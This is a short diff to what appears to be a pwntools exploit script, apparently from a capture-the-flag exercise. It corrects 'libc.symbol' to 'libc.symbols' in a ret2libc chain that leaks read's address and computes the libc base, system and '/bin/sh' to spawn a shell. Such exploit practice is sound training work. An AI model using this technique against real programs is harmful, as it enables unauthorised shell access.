@@ -36,8 +36,8 @@ p.sendline(payload)
 
 read_addr = u32(p.recv(4))
 
-libc_base = read_addr - libc.symbol['read']
-system_addr = libc_base + libc.symbol['system']
+libc_base = read_addr - libc.symbols['read']
+system_addr = libc_base + libc.symbols['system']
 binsh = libc_base + list(libc.search(b'/bin/sh'))[0]
 
 
